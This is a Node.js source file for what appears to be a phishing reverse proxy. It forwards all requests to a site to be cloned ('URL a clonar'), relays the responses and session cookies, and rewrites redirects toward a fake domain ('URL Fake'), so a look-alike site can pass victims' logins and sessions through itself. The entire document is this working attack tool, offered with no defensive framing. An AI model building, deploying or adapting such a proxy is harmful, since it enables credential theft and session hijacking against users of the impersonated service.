const fetch = require("node-fetch");
const fs = require("fs");
const http = require("http");
const port = 20020;
const url_dest = ""; // URL a clonar
const url_new = ""; // URL Fake
let server = http.createServer();
server.on("request", read);
server.listen(port, function () {
  console.log("server on", process.pid);
});
function read(req, res) {
  let body = [];
  let url = new URL(req.url, `http://${req.headers.host}`);
  req.on("data", (chunk) => {
    body.push(chunk);
  });
  req.on("end", () => {
    body = Buffer.concat(body).toString();
    let query = {};
    url.searchParams.forEach((val, name) => {
      if (typeof query[name] == "undefined") {
        query[name] = [val];
      } else {
        query[name].push(val);
      }
    });
    run(res, body, query, req.url, req.method, req.headers, url.pathname);
  });
}
async function run(res, body, query, path, method, headers, path_solo) {
  headers.host = url_dest;
  //console.log(body, query, path, method, headers);
  console.log(url_dest + path);
  if (path_solo == "/sso.html") {
    res.end("hi");
    return;
  }
  let _res = "";
  if (body != "") {
    _res = await fetch("https://" + url_dest + path, {
      method: method,
      headers: headers,
      body: body,
      follow: 0,
      redirect: "manual",
    });
  } else {
    _res = await fetch("https://" + url_dest + path, {
      method: method,
      headers: headers,
      follow: 0,
      redirect: "manual",
    });
  }
  res.statusCode = _res.status;
  let content = _res.headers.get("content-type");
  let location = _res.headers.get("location");
  let cookie = _res.headers.raw()["set-cookie"];
  if (cookie != undefined) {
    for (let w in cookie) {
      res.setHeader("set-cookie", cookie[w]);
    }
  }
  if (location != null) {
    res.setHeader("Location", location.replace(url_dest, url_new));
    res.statusCode = 302;
  }
  _res = await _res.arrayBuffer();
  res.setHeader("Content-Type", content);
  res.end(Buffer.from(_res, "binary"));
}
